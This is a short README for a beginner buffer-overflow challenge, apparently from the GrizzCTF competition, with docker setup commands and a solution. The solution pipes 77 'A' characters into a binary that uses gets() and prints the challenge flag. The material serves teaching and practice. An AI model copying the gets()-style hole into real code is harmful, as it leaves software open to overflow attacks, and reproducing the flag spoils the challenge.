# Getting Started

**Author**: Evan Pardon [supasuge](https://github.com/supasuge)
**Difficulty**: Very Easy
**Category**: Pwn
**Points**: $50$

## Description:

Simple buffer overflow challenge to overflow a variable that calls a hidden function.

## Flag format:

```
GrizzCTF{...}
```

## Build instructions (if any):

```bash
cd Getting-Started/build
docker build -t pwn-getting-started .
```

## Running the challenge container:

```bash
docker run -d -p 13372:13372 -it pwn-getting-started
```

###### Solution

```bash
Getting-Started/build » python -c 'print("A"*77)' | ./vuln 
Enter your data: Authenticated! Here is your flag: GrizzCTF{s1mpl3_0v3rf10w_3h}
```

In summary, this code is vulnerable to a buffer overflow due to the use of the deprecated & unsafe `gets()` function.